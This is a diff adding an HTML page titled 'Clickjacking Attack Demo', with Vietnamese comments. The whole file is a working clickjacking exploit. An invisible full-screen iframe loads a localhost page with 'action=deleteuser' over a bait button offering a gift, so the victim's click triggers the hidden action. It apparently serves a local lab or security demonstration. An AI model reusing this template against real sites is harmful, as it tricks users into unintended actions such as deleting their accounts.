@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <title>Clickjacking Attack Demo</title>
+  <style>
+    /* iframe sẽ chiếm toàn bộ trang nhưng vô hình */
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      opacity: 0;
+      pointer-events: auto; /* Cho phép iframe nhận sự kiện click */
+      z-index: 9999;
+    }
+    /* Một lớp phủ có thể là cái người dùng nhìn thấy để lừa bấm */
+    #fakeButton {
+      position: relative;
+      width: 200px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: #f44336;
+      color: white;
+      font-size: 24px;
+      text-align: center;
+      cursor: pointer;
+      border-radius: 8px;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="fakeButton">Bấm vào đây để nhận quà!</div>
+
+  <iframe src="http://localhost:8082/thong-tin-ca-nhan?action=deleteuser" frameborder="0"></iframe>
+
+  <script>
+    // Khi người dùng bấm vào "fakeButton", iframe bên dưới sẽ nhận click thật sự.
+    const fakeButton = document.getElementById('fakeButton');
+    fakeButton.addEventListener('click', () => {
+      // Không cần làm gì, click sẽ truyền qua iframe do iframe opacity=0 và pointer-events=auto
+    });
+  </script>
+</body>
+</html>
